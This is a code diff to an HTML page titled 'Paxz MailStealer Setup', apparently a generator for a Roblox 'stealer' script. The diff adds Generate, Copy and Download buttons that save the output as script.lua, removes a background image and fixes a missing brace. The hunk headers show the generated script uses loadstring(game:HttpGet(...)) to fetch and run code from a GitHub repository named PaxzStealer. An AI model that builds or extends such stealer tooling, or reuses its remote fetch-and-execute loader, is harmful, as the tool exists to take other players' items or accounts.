@@ -78,9 +78,6 @@
   </style>
 </head>
 <body>
-  <div id="animationContainer">
-    <img src="https://wallpapercave.com/wp/wp2760959.gif" alt="Animated Background" style="width: 100%; height: 100vh; object-fit: cover;">
-  </div>
   
   <div class="container">
     <h1>Paxz MailStealer Setup</h1>
@@ -121,6 +118,10 @@
       <button type="button" id="generateScriptBtn">Generate Script</button>
     </form>
 
+    <button type="button" id="generateScriptBtn">Generate Script</button>
+    <button type="button" id="copyScriptBtn">Copy Script</button>
+    <a id="downloadScriptBtn" download="script.lua"><button>Download Script</button></a>
+    
     <div id="scriptOutput" style="display: none;">
       <h2>Generated Script:</h2>
       <pre id="scriptCode"></pre>
@@ -165,7 +166,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main
       scriptCode.textContent = generatedScript;
       scriptOutput.style.display = "block";
 
-    copyScriptBtn.addEventListener("click", () => {
+     copyScriptBtn.addEventListener("click", () => {
       const scriptText = scriptCode.textContent;
       navigator.clipboard.writeText(scriptText)
         .then(() => {
@@ -174,6 +175,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main
         .catch((error) => {
           console.error("Copy failed:", error);
         });
+    });
 
     downloadScriptBtn.addEventListener("click", () => {
       const scriptText = scriptCode.textContent;
